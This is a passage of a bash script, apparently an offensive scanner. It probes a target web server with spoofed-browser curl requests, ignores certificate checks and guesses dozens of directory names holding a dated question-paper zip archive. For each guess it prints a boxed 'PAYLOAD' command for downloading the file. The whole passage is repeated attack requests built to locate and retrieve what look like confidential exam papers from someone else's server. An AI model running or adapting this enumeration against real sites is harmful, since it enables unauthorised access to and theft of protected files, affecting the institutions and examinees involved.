code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
